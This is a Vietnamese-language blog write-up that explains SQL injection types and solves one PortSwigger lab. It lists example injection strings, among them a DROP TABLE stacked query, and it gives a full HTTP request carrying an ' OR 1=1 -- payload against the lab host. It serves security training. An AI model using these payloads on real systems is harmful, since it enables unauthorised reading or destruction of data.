---
title: "[PortSwigger Lab] - Sql Injection"
description: The first post
date: 2025-05-21 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/sql_injection.png
    alt: Sql Injection
---

## Introduction
---
### What is SQL Injection(SQLi)? 
SQL Injection (SQLi) là một dạng tấn công bảo mật trong đó kẻ tấn công chèn (inject) mã SQL độc hại vào một truy vấn cơ sở dữ liệu thông qua các đầu vào không được kiểm soát (chẳng hạn như form đăng nhập, URL, cookie...). Mục tiêu là can thiệp vào truy vấn SQL gốc mà ứng dụng web thực hiện, từ đó có thể:
- Xem dữ liệu mà bình thường không được phép truy cập (vd: thông tin người dùng, mật khẩu đã mã hóa).
- Thay đổi dữ liệu (vd: cập nhật thông tin người dùng, xóa dữ liệu).
- Thực thi các lệnh quản trị cơ sở dữ liệu (vd: DROP TABLE).
- Trong trường hợp nặng hơn, có thể chiếm quyền điều khiển server.

### Type of SQL Injection(SQLi)?

| Type                  | Description                                                                                   |
|-----------------------|-----------------------------------------------------------------------------------------------|
| **Classic (In-band)** | Kẻ tấn công thấy ngay kết quả của truy vấn bị chèn SQL, thường dùng `' OR '1'='1` để bypass.  |
| **Tautology-based**   | Chèn biểu thức luôn đúng vào câu lệnh WHERE để qua mặt kiểm tra xác thực. Ví dụ: `admin' --` |
| **Union-based**       | Dùng `UNION` để nối thêm kết quả từ truy vấn khác, thường để đọc dữ liệu bảng nhạy cảm.       |
| **Boolean-based Blind** | Dựa vào phản hồi đúng/sai từ server để suy đoán thông tin. Ví dụ: `' AND 1=1 --`            |
| **Time-based Blind**  | Sử dụng hàm gây trễ như `SLEEP()` để xác định kết quả thông qua thời gian phản hồi.          |
| **Error-based**       | Khai thác lỗi trả về để lấy thông tin cấu trúc cơ sở dữ liệu.                                 |
| **Out-of-Band (OOB)** | Không nhận phản hồi trực tiếp, thay vào đó gửi dữ liệu ra ngoài (DNS, HTTP).                 |
| **Stacked Queries**   | Chạy nhiều truy vấn trong một lần, ví dụ: `1'; DROP TABLE users --`                           |
| **Second-order**      | Dữ liệu độc hại được lưu vào DB và thực thi sau ở một vị trí khác trong ứng dụng.            |


## Solve SQL Injection Labs
---
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Payload**

```http
GET /filter?category=' OR 1=1 -- HTTP/2
Host: 0aa400cc04b07ef3818389f900dd00df.web-security-academy.net
Cookie: session=yZBtDkvQeeDa4uB73dOkqbid2NF9Yiq2
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa400cc04b07ef3818389f900dd00df.web-security-academy.net/filter?category=Pets
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```


---
Goodluck! 🍀🍀🍀